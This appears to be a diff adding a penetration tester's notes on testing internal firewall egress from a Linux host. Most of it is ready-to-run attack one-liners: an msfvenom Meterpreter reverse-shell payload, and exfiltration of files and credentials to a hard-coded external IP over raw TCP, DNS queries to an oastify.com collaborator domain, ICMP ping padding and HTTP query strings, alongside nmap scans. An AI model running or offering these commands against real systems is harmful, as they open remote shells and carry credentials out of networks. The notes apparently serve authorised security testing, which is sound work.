@@ -1,0 +1,65 @@
+Internal Firewall Penetration Testing (if provided system was linux)
+
+meterpreter reverse shell:
+
+make a reverse shell payload and send to internal machine with apache service (AWS)
+
+msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=9191 -f elf > shell.elf (AWS) (use different payloads as well like bind)
+
+listen to your Metasploit for connection (AWS)
+
+execute payload (internal)
+
+PINGSWEEP (metasploit after getting reverse connection)
+
+Netcat data Exfiltration:
+
+Step 1: Username and password were sent in nothing.txt file within important directory
+
+tar zcf - important/ | base64 | dd conv=ebcdic > /dev/tcp/3.110.84.217/6565
+
+Step 2: creds.txt file received to the external server.
+
+nc -lvp 6565 > important/nothing.txt
+
+DNS Data Exfiltration ()  ????
+
+cat creds.txt |base64 | tr -d "\n" | fold -w18 |sed 's/.*/&./' | tr -d "\n" | sed 's/$/2il5xbs78lj24gby8p2du3e2qtwjk8.oastify.com/ | awk '{print "dig +short " $1} | bash  (use hex encoding insted of base64)
+
+poll now (burp) check for encrypted creds
+
+Weak Ciphers Enabled
+
+-p443 --script ssl-enum-ciphers
+
+Blacklisted IP accessibility
+
+Used this reference for list of blacklisted IP Addresses https://github.com/stamparm/ipsum
+
+ping and curl to check weather its accessible or not
+
+ICMP Exfiltration
+
+echo "admin:password" | xxd -p
+
+(output of upper command used in below command after -p)
+
+ping 3.110.84.217 -c 1 -p  <hash_here>
+
+tcpdump -i eth0 icmp -X (AWS)
+
+HTTP Exfiltration () ???
+
+run appache server in aws first
+
+echo "admin:password" |xxd -p
+
+(output of upper command used in below command after any parameter)
+
+curl http://3.110.84.217/?hacker=&lt;hash_here&gt;
+
+cat /var/log/apache2/access.log (AWS)
+
+PORT scanning
+
+nmap (all tcp udp)
